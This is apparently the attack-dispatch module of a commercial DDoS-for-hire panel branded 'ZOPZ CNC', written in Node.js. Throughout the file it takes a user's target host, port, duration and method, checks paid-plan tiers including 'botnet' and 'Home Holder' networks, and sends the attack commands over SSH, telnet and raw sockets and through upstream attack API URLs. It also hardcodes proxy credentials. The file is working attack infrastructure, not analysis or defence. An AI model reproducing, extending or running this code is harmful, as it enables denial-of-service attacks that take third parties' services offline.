const fs = require('fs');
const path = require('path');
const axios = require('axios');
const net = require('net');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { Client } = require('ssh2');

if (typeof __dirname === 'undefined') {
  global.__dirname = path.resolve();
}

eval(fs.readFileSync(path.join(__dirname, './utils/Base64.js'), 'utf8'));
eval(fs.readFileSync(path.join(__dirname, './utils/Info.js'), 'utf8'));
eval(fs.readFileSync(path.join(__dirname, './utils/AsyncQueue.js'), 'utf8'));

const blacklist = JSON.parse(fs.readFileSync(path.join(__dirname, './configs/blacklist.json')));
const config = require('./configs/main.json');  // Initial config load
const methodconfig = require('./configs/methods.json');  // Initial config load

const agent = new HttpsProxyAgent('http://proxyauth:zopz@proxy.zopzstress.st:3128');

const activeGroupSlots = {};

function canUseGroupSlot(groupName, maxSlots) {
  if (!activeGroupSlots[groupName]) {
    activeGroupSlots[groupName] = 0;
  }
  return activeGroupSlots[groupName] < maxSlots;
}

function markGroupSlotUsed(groupName) {
  activeGroupSlots[groupName] = (activeGroupSlots[groupName] || 0) + 1;
}

function releaseGroupSlot(groupName) {
  if (activeGroupSlots[groupName]) {
    activeGroupSlots[groupName]--;
    if (activeGroupSlots[groupName] <= 0) 
      delete activeGroupSlots[groupName];
  }
}

class UnifiedAttackHandler {
  constructor() {
    this.methods = this.loadmethods();
    this.activeAttacks = new Map();
    this.cooldowns = new Map();
    this.userQueues = new Map();
    this.watchMethodFile();
  }
    
  getUserQueue(username) {
    if (!this.userQueues.has(username)) {
      this.userQueues.set(username, new AsyncQueue());
    }
    return this.userQueues.get(username);
  }

  async processRequest(method, params, user) {
    return await this.getUserQueue(user.username).enqueue(async () => {
      // Validation: Methods loaded
      if (!this.methods || typeof this.methods !== 'object') {
        console.log(`Failed request for user: ${user.username} - Reason: attack methods not loaded\r`);
        return { error: 'attack methods not loaded' }; 
      }    

      // Validation: Attacks enabled globally
      if (!config.attacks_enabled) {
        console.log(`[API Queue] Failed API request for user: ${user.username} - Reason: Attacks are Disabled.`);
        return { error: 'Attacks are Disabled' };
      }

      console.log(`Processing request for user: ${user.username}\r`);
      const methodConfig = this.methods[method.toLowerCase()];
      
      // Validation: Method exists and enabled
      if (!methodConfig || !methodConfig.enabled) {
        console.log(`Failed request for user: ${user.username} - Reason: Method ${method} not found or disabled\r`);
        return { error: `Method ${method} not found or disabled` }; 
      }

      // Validation: User banned
      if (user.banned) {
        console.log(`Failed request for user: ${user.username} - Reason: User is banned${user.banReason ? ` (${user.banReason})` : ''}`);
        return { error: `Your account is banned ${user.banReason ? `: ${user.banReason}` : ''}` };
      }

// Validation: Cooldown check
if (!user.spambypass) {
    const cd = this.isOnCooldown(user.username, method);
    if (cd) {
        console.log(`[COOLDOWN BLOCK] User "${user.username}" blocked - Cooldown ${cd.remaining}s remaining.`);
        return { error: `Cooldown active. ${cd.remaining}s remaining` };
    }
}

// Apply cooldown only if user does NOT have spambypass
if (!user.spambypass) {
    this.setCooldown(user, method);
}

      // Validation: Parameters
      if (!params || typeof params !== 'object' || !params.host) {
        this.removeCooldown(user, method);
        console.log(`Failed request for user: ${user.username} - Reason: Invalid parameters\r`);
        return { error: 'Invalid parameters' }; 
      }

      let rawHost = params.host.trim();
      let sanitizedHost = rawHost.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
      
      // Get target details
      const targetDetails = await globalThis.getTargetDetails(params.host);
      if (!targetDetails) {
        this.removeCooldown(user, method);
        console.log(`Failed to fetch target details.\r`);
        return { error: `Failed to fetch target details.` }; 
      }

      // Validation: IP or Domain checking
      if (this.isValidIp(sanitizedHost)) {
        // IP-based validations
        if (blacklist.ip_address.includes(sanitizedHost) && !user.blacklistbypass) {
          this.removeCooldown(user, method);
          console.log(`Failed request for user: ${user.username} - Reason: Blacklisted IP ${sanitizedHost}\r`);
          return { error: `Host "${sanitizedHost}" is blacklisted` }; 
        }

        if (blacklist.hard_blacklsit.some(item => params.host.includes(item))) {
          this.removeCooldown(user, method);
          console.log(`Failed request for user: ${user.username} - Reason: Blacklisted Command ${params.host}\r`);
          return { error: `Host "${params.host}" is blacklisted` };
        }

        if (!this.isValidNumber(params.port, 1, 65535)) {
          this.removeCooldown(user, method);
          console.log(`Failed request for user: ${user.username} - Reason: Invalid port\r`);
          return { error: 'Invalid port number' }; 
        }

        if (methodConfig.domain && !methodConfig.ipv4) {
          this.removeCooldown(user, method);
          console.log(`Failed request for user: ${user.username} - Reason: Method is domain only\r`);
          return { error: `Method is domain only` }; 
        }
      
        if (blacklist.asn.includes(targetDetails.asn) && !user.blacklistbypass) {
          this.removeCooldown(user, method);
          console.log(`Failed request for user: ${user.username} - Reason: Blacklisted ASN ${targetDetails.asn} for IP ${params.host}\r`);
          return { error: `Target ASN (${targetDetails.asn}) is blacklisted` }; 
        }
      } 
      else {
        // Domain-based validations
        const domain = this.getDomain(params.host);
        if (!domain) {
          this.removeCooldown(user, method);
          console.log(`Failed request for user: ${user.username} - Reason: Invalid domain\r`);
          return { error: 'Invalid domain' }; 
        }

        if (methodConfig.ipv4) {
          this.removeCooldown(user, method);
          console.log(`Failed request for user: ${user.username} - Reason: Method is ipv4 only\r`);
          return { error: `Method is ipv4 only` }; 
        }

        if (!user.blacklistbypass) {
          if (blacklist.domain[domain]) {
            this.removeCooldown(user, method);
            console.log(`Failed request for user: ${user.username} - Reason: Blacklisted domain ${params.host}\r`);
            return { error: `Host "${params.host}" is blacklisted` }; 
          }
          for (const t of blacklist.domain_type) {
            if (domain.endsWith(t)) {
              this.removeCooldown(user, method);
              console.log(`Failed request for user: ${user.username} - Reason: Blocked domain type\r`);
              return { error: 'Target domain type is blocked' }; 
            }
          }
        }
      }

      // Validation: Time constraints
      if (!this.isValidNumber(params.time, 1, user.maxTime)) {
        this.removeCooldown(user, method);
        console.log(`Failed request for user: ${user.username} - Reason: Invalid time\r`);
        return { error: `Time must be between 1 and ${user.maxTime} seconds` }; 
      }

      if (params.time > methodConfig.maxTime) {
        this.removeCooldown(user, method);
        console.log(`Failed request for user: ${user.username} - Reason: Time exceeds max allowed\r`);
        return { error: `Time exceeds maximum allowed (${methodConfig.maxTime}s)` }; 
      }

      if (params.time < methodConfig.min_time) {
        this.removeCooldown(user, method);
        console.log(`Failed request for user: ${user.username} - Reason: Time below min allowed\r`);
        return { error: `Time below minimum allowed (${methodConfig.min_time}s)` }; 
      }

      // Validation: Permission checks
      if (methodConfig.vip && !user.vip) {
        this.removeCooldown(user, method);
        console.log(`Failed request for user: ${user.username} - Reason: User lacks VIP\r`);
        return { error: `User doesn't have VIP network!!` }; 
      }
      
      if (methodConfig.admin && !user.admin) {
        this.removeCooldown(user, method);
        console.log(`Failed request for user: ${user.username} - Reason: User lacks admin\r`);
        return { error: `User doesn't have admin access!!` }; 
      }

      if (methodConfig.homeholder && !user.homeholder) {
        this.removeCooldown(user, method);
        console.log(`Failed request for user: ${user.username} - Reason: User lacks Home Holder\r`);
        return { error: `User doesn't have Home Holder network!!` }; 
      }

      if (methodConfig.botnet && !user.botnet) {
        this.removeCooldown(user, method);
        console.log(`Failed request for user: ${user.username} - Reason: User lacks botnet\r`);
        return { error: `User doesn't have botnet network!!` }; 
      }
      // Validation: Whitelist check
      if (methodConfig.whitelist && methodConfig.whitelist.userenabled) {
        const isWhitelisted = methodConfig.whitelist.users.some(
          whitelistedUser => whitelistedUser.toLowerCase() === user.username.toLowerCase()
        );
        
        if (!isWhitelisted) {
          this.removeCooldown(user, method);
          console.log(`Failed request for user: ${user.username} - Reason: Not whitelisted for method ${method}\r`);
          return { error: `You are not authorized to use the ${method} method` }; 
        }
      }
      // Validation: Duplicate attack check
      const sameHost = [...this.activeAttacks.values()].find(a => a.username === user.username && a.params.host === params.host);
      if (sameHost && !user.spambypass) {
        this.removeCooldown(user, method);
        const rem = Math.ceil((sameHost.startTime + sameHost.params.time * 1000 - Date.now()) / 1000);
        console.log(`Failed request for user: ${user.username} - Reason: Duplicate attack (${rem}s remaining)\r`);
        return { error: `Ongoing attack to ${params.host} in progress. ${rem}s remaining` }; 
      }

      // Validation: Method concurrent limit
      const concurrentMethodCount = [...this.activeAttacks.values()].filter(a => a.username === user.username && a.method === method).length;
      if (concurrentMethodCount >= methodConfig.maxConcurrents) {
        this.removeCooldown(user, method);
        console.log(`Failed request for user: ${user.username} - Reason: Too many concurrent ${method}\r`);
        return { error: `Maximum concurrent reached (${methodConfig.maxConcurrents}) for ${method}` }; 
      }

      // Validation: User concurrent limit
      const concurrentCount = [...this.activeAttacks.values()].filter(a => a.username === user.username).length;
      if (concurrentCount >= user.concurrents) {
        this.removeCooldown(user, method);
        console.log(`Failed request for user: ${user.username} - Reason: Too many total concurrents\r`);
        return { error: `Maximum concurrent reached (${user.concurrents}) for ${user.username}` }; 
      }

      // Validation: Method group slots
      if (methodConfig.group) {
        const groupData = config.attack_settings.method_groups.find(g => g.name === methodConfig.group);
        if (groupData) {
          const groupName = groupData.name;
          const groupSlots = groupData.max_slots;
          if (!canUseGroupSlot(groupName, groupSlots)) {
            this.removeCooldown(user, method);
            console.log(`Failed request for user: ${user.username} - Reason: group ${groupName} slots full\r`);
            return { error: `The "${groupName}" methods group max attack slots are used (${groupSlots}).` }; 
          }
          markGroupSlotUsed(groupName);
          const attackDuration = parseInt(params.time, 10);
          if (isNaN(attackDuration) || attackDuration <= 0) {
            this.removeCooldown(user, method);
            console.log(`Failed request for user: ${user.username} - Reason: Invalid attack time\r`);
            releaseGroupSlot(groupName);
            return { error: `Invalid attack time specified.` }; 
          }
          setTimeout(() => {
            releaseGroupSlot(groupName);
          }, attackDuration * 1000);
        }
      }

      // All validations passed - Execute attack
      const requestId = Date.now().toString() + Math.random().toString(36).slice(2, 15);
      this.activeAttacks.set(requestId, {
        id: requestId,
        username: user.username,
        method,
        params,
        startTime: Date.now()
      });

      setTimeout(() => this.activeAttacks.delete(requestId), params.time * 1000);

      // Send commands to servers and APIs
      this.sendServerCommand(method, params).catch(e => console.error('ServerCmd Error:', e));
      this.sendApiCommand(method, params).catch(e => console.error('ApiCmd Error:', e));
      
      console.log(`Successful request for user: ${user.username}\r`);
      return {
        success: true,
        requestId,
        target: {
          host: params.host,
          port: params.port,
          duration: params.time,
          method,
          time_sent: new Date().toISOString(),
          ...targetDetails
        }
      };
    });
  }

  async sendServerCommand(method, params) {
    let successCount = 0;
    const methodDef = this.methods?.[method];
    if (!methodDef || !Array.isArray(methodDef.servers)) {
      return successCount;
    }
    const smIP = params.host.replace(/\./g, '');
    const IAC = 255, DO = 253, DONT = 254, WILL = 251, WONT = 252;
    const promises = methodDef.servers.map(server => new Promise(resolve => {
      const command = server.command.replace(/\{\{(\w+)\}\}/g, (_, key) => ({
        session: smIP,
        host: params.host,
        port: params.port,
        time: params.time,
        len: params.len
      })[key] || '');
      console.log(`${server.name} Executing command: ${command}\r`);
      const portsToTry = Array.isArray(server.port) ? server.port : [server.port || (server.type === 'telnet' ? params.port : server.type === 'raw' ? params.port : 22)];
      const tryNextPort = (index) => {
        if (index >= portsToTry.length) {
          console.error(`${server.name} All ${server.type || 'ssh'} port attempts failed\r`);
          return resolve(false);
        }
        const port = portsToTry[index];
        if (server.type === 'telnet') {
          const socket = new net.Socket();
          let connected = false;
          let sentUser = false, sentPass = false, sentCaptcha = false, sentCommand = false;
          const cleanup = () => {
            socket.removeAllListeners();
            socket.destroy();
          };
          const globalTimeout = setTimeout(() => {
            console.error(`${server.name} Telnet global timeout on port ${port}\r`);
            cleanup();
            tryNextPort(index + 1);
          }, 15000);
          socket.setNoDelay(true);
          socket.setTimeout(10000);
          socket.connect(port, server.host, () => {
            connected = true;
            console.log(`${server.name} Telnet connected on port ${port}\r`);
            socket.write('\r\n');
          });
          socket.on('data', buffer => {
            let i = 0;
            while (i < buffer.length && buffer[i] === IAC && i + 2 < buffer.length) {
              const cmd = buffer[i + 1], opt = buffer[i + 2];
              if (cmd === DO) socket.write(Buffer.from([IAC, WONT, opt]));
              if (cmd === WILL) socket.write(Buffer.from([IAC, DONT, opt]));
              i += 3;
            }
            const txt = buffer.slice(i).toString('utf8')
                .replace(/\u001b\[[0-9;]*[A-Za-z]/g, '')
                .replace(/\u001b\][^\u0007]*\u0007/g, '');
            console.log(`${server.name} Telnet response: ${txt.trimEnd()}\r`);
            if (sentCommand) {
              cleanup();
              clearTimeout(globalTimeout);
              return resolve(true);
            }
            if (!sentUser && txt.includes('Username:')) {
              if (!server.username) {
                console.error(`${server.name} Username prompt received but no username provided in methods.json\r`);
                cleanup();
                clearTimeout(globalTimeout);
                tryNextPort(index + 1);
                return;
              }
              socket.write(Buffer.from(`${server.username}\r\n`));
              console.log(`${server.name} Sent username: ${server.username}\r`);
              sentUser = true;
            } else if (!sentPass && sentUser && txt.includes('Password:')) {
              if (!server.password) {
                console.error(`${server.name} Password prompt received but no password provided in methods.json\r`);
                cleanup();
                clearTimeout(globalTimeout);
                tryNextPort(index + 1);
                return;
              }
              socket.write(Buffer.from(`${server.password}\r\n`));
              console.log(`${server.name} Sent password\r`);
              sentPass = true;
            } else if (!sentCaptcha && sentPass && /Captcha/i.test(txt)) {
              if (!params.captcha && !server.captcha) {
                console.error(`${server.name} CAPTCHA prompt received but no CAPTCHA provided\r`);
                cleanup();
                clearTimeout(globalTimeout);
                tryNextPort(index + 1);
                return;
              }
              socket.write(Buffer.from(`${params.captcha || server.captcha}\r\n`));
              console.log(`${server.name} Sent CAPTCHA\r`);
              sentCaptcha = true;
            } else if (!sentCommand && sentPass && (txt.endsWith('> ') || txt.endsWith('$ ') || txt.endsWith('\r\n'))) {
              socket.write(Buffer.from(`${command}\r\n`));
              console.log(`${server.name} Sent command: ${command}\r`);
              sentCommand = true;
            }
          });
          socket.on('timeout', () => {
            console.error(`${server.name} Telnet timeout on port ${port}\r`);
            cleanup();
            tryNextPort(index + 1);
          });
          socket.on('error', err => {
            console.error(`${server.name} Telnet error on port ${port}: ${err.message}\r`);
            cleanup();
            clearTimeout(globalTimeout);
            tryNextPort(index + 1);
          });
          socket.on('close', hadError => {
            clearTimeout(globalTimeout);
            cleanup();
            if (connected && !hadError && sentCommand) {
              console.log(`${server.name} Telnet session closed\r`);
              return resolve(true);
            } else {
              console.log(`${server.name} Telnet closed, hadError=${hadError}, sentCommand=${sentCommand}\r`);
              tryNextPort(index + 1);
            }
          });
        } else if (server.type === 'raw') {
          const socket = new net.Socket();
          let connected = false;
          let sentUser = false, sentPass = false, sentCaptcha = false, sentCommand = false;
          let loginFailed = false;
          const cleanup = () => {
            socket.removeAllListeners();
            socket.destroy();
          };
          const globalTimeout = setTimeout(() => {
            console.error(`${server.name} Raw connection timeout on port ${port}\r`);
            cleanup();
            tryNextPort(index + 1);
          }, 15000);
          socket.setNoDelay(true);
          socket.setTimeout(10000);
          socket.connect(port, server.host, () => {
            connected = true;
            console.log(`${server.name} Raw connection established on port ${port}\r`);
            if (server.username && server.password) {
              socket.write(Buffer.from(`${server.username}\r\n${server.password}\r\n`));
              console.log(`${server.name} Sent username: ${server.username} and password\r`);
              sentUser = true;
              sentPass = true;
            } else {
              socket.write(Buffer.from(`${command}\r\n`));
              console.log(`${server.name} No credentials provided, sent command: ${command}\r`);
              sentCommand = true;
            }
          });
          socket.on('data', buffer => {
            const txt = buffer.toString('utf8')
                .replace(/\u001b\[[0-9;]*[A-Za-z]/g, '')
                .replace(/\u001b\][^\u0007]*\u0007/g, '');
            console.log(`${server.name} Raw response: ${txt.trimEnd()}\r`);
            if (loginFailed) {
              console.error(`${server.name} Skipping further processing due to login failure\r`);
              return;
            }
            if (sentCommand) {
              cleanup();
              clearTimeout(globalTimeout);
              return resolve(true);
            }
            if ((sentUser || sentPass) && /invalid/i.test(txt)) {
              console.error(`${server.name} Login failed: ${txt.trimEnd()}\r`);
              loginFailed = true;
              cleanup();
              clearTimeout(globalTimeout);
              tryNextPort(index + 1);
              return;
            } else if (!sentCaptcha && sentPass && /Captcha/i.test(txt)) {
              if (!params.captcha && !server.captcha) {
                console.error(`${server.name} CAPTCHA prompt received but no CAPTCHA provided\r`);
                loginFailed = true;
                cleanup();
                clearTimeout(globalTimeout);
                tryNextPort(index + 1);
                return;
              }
              socket.write(Buffer.from(`${params.captcha || server.captcha}\r\n`));
              console.log(`${server.name} Sent CAPTCHA\r`);
              sentCaptcha = true;
            } else if (!sentCommand && sentPass && (txt.includes('> ') || txt.includes('$ ') || txt.includes('\r\n'))) {
              socket.write(Buffer.from(`${command}\r\n`));
              console.log(`${server.name} Sent command: ${command}\r`);
              sentCommand = true;
            }
          });
          socket.on('timeout', () => {
            console.error(`${server.name} Raw connection timeout on port ${port}\r`);
            cleanup();
            clearTimeout(globalTimeout);
            tryNextPort(index + 1);
          });
          socket.on('error', err => {
            console.error(`${server.name} Raw connection error on port ${port}: ${err.message}\r`);
            cleanup();
            clearTimeout(globalTimeout);
            tryNextPort(index + 1);
          });
          socket.on('close', hadError => {
            clearTimeout(globalTimeout);
            cleanup();
            if (connected && sentCommand && !hadError && !loginFailed) {
              console.log(`${server.name} Raw connection session closed\r`);
              return resolve(true);
            } else {
              console.log(`${server.name} Raw connection closed, hadError=${hadError}, sentCommand=${sentCommand}, loginFailed=${loginFailed}\r`);
              tryNextPort(index + 1);
            }
          });
        } else {
          const conn = new Client();
          let timeoutHandle = setTimeout(() => {
            console.error(`${server.name} SSH global timeout on port ${port}\r`);
            conn.end();
            resolve(false);
          }, 10000);
          conn.on('ready', () => {
            console.log(`${server.name} SSH connection established on port ${port}\r`);
            conn.exec(command, (err, stream) => {
              if (err) {
                console.error(`${server.name} SSH Exec Error: ${err.message}\r`);
                conn.end();
                clearTimeout(timeoutHandle);
                return resolve(false);
              }
              stream.on('close', () => {
                conn.end();
                clearTimeout(timeoutHandle);
                resolve(true);
              }).on('data', data => {
                console.log(`${server.name} STDOUT: ${data.toString().trim()}\r`);
              }).stderr.on('data', data => {
                console.error(`${server.name} STDERR: ${data.toString().trim()}\r`);
              });
            });
          }).on('error', err => {
            console.error(`${server.name} SSH Connection Error on port ${port}: ${err.message}\r`);
            if (err.level === 'client-authentication') {
              console.error(`${server.name} SSH Authentication failed for username: ${server.username}\r`);
            }
            clearTimeout(timeoutHandle);
            tryNextPort(index + 1);
          }).on('end', () => {
            clearTimeout(timeoutHandle);
          }).connect({
            host: server.host,
            port,
            username: server.username,
            password: server.password
          });
        }
      };
      tryNextPort(0);
    }));
    const results = await Promise.allSettled(promises);
    successCount = results.filter(r => r.status === 'fulfilled' && r.value === true).length;
    return successCount;
  }
    
  async sendApiCommand(method, params) {
    let successCount = 0;
    const methodDef = this.methods?.[method];
    if (!methodDef || !Array.isArray(methodDef.urls)) {
      return successCount;
    }
    const { urls, error } = this.generateApiUrls(method, params);
    if (error) return 0;
    for (const url of urls) {
      const start = Date.now();
      try {
        const res = await axios.get(url, {
          //httpAgent: agent,
          //httpsAgent: agent,
          timeout: 10000, 
          headers: {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',
            'User-Agent': 'Mozilla/5.0 (ZOPZ CNC) V4',
          }
        });
        const duration = Date.now() - start;
        console.log(`--- API Response (${res.status === 200 ? "Success" : "Failure"}) ---\r`);
        console.log(`URL: ${url}\r`);
        console.log(`Status: ${res.status} ${res.statusText}\r`);
        console.log(`Body:`, res.data, `\r`);
        if (res.status === 200) successCount++;
      } catch (e) {
        const duration = Date.now() - start;
        console.error(`--- API Request Failed ---\r`);
        console.error(`URL: ${url}\r`);
        console.error(`Error: ${e.message}\r`);
        if (axios.isCancel(e)) {
          console.error(`Request was canceled\r`);
        }
        if (e.response) {
          console.error(`Status: ${e.response.status}\r`);
          console.error(`Body:`, e.response.data, `\r`);
        }
      }
    }
    return successCount;
  }
    
  isValidIp = (ip) => /^(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)$/.test(ip);

  isValidNumber = (value, min, max) => {
    const num = Number(value);
    return Number.isInteger(num) && num >= min && num <= max;
  };

  getDomain(targetUrl) {
    try {
      const parsedUrl = new URL(targetUrl);
      return parsedUrl.hostname;
    } catch (error) {
      return null;
    }
  }
isOnCooldown(username, method) {
  const key = `${username}:${method}`;
  const cooldown = this.cooldowns.get(key);

  if (!cooldown) return false;

  const now = Date.now();

  if (now < cooldown.endTime) {
    return { remaining: Math.ceil((cooldown.endTime - now) / 1000) };
  }

  this.cooldowns.delete(key);
  return false;
}

setCooldown(user, method) {
  if (!user.cooldown || user.cooldown <= 0) return;

  const key = `${user.username}:${method}`;
  const endTime = Date.now() + user.cooldown * 1000;

  this.cooldowns.set(key, { endTime });
}

removeCooldown(user, method) {
  const key = `${user.username}:${method}`;
  this.cooldowns.delete(key);
}

  generateApiUrls(method, params) {
    const api = this.methods[method];
    if (!api || !api.enabled) {
      return { error: `Endpoint "${method}" not found or disabled` };
    }
    const { urls, maxConcurrents } = api;
    const generatedUrls = urls.map(urlObj => urlObj.url
      .replace(/\{host\}|\{HOST\}|<<\$host>>/g, encodeURIComponent(params.host))
      .replace(/\{port\}|\{PORT\}|<<\$port>>/g, encodeURIComponent(params.port))
      .replace(/\{time\}|\{TIME\}|<<\$time>>/g, encodeURIComponent(params.time)));
    return { urls: generatedUrls, maxConcurrents };
  }

  loadmethods() {
    this.methods = JSON.parse(fs.readFileSync(path.join(__dirname, './configs/methods.json')));
  }
    
  watchMethodFile() {
    const configs = [
      { name: 'methods.json', target: 'methods' },
      { name: 'blacklist.json', target: 'blacklist' },
      { name: 'plans.json', target: 'plans' }
    ];

    configs.forEach(({ name, target }) => {
      const filePath = path.join(__dirname, './configs/', name);
      let lastContent = '';
      fs.watchFile(filePath, { interval: 1000 }, (curr, prev) => {
        if (curr.mtime === prev.mtime) return;
        fs.readFile(filePath, 'utf8', (err, data) => {
          if (err) return console.error(`Failed to read ${name}:\r`, err.message);
          if (data === lastContent) return;
          try {
            const parsed = JSON.parse(data);
            this[target] = parsed;
            lastContent = data;
            console.log(`${name} reloaded successfully\r`);
          } catch (err) {
            console.error(`Invalid JSON in ${name}, ignoring update:\r`, err.message);
          }
        });
      });
    });
  }
}

// Export as both names for compatibility
globalThis.AttackHandler = UnifiedAttackHandler;
globalThis.ApiHandler = UnifiedAttackHandler;
globalThis.UnifiedAttackHandler = UnifiedAttackHandler;

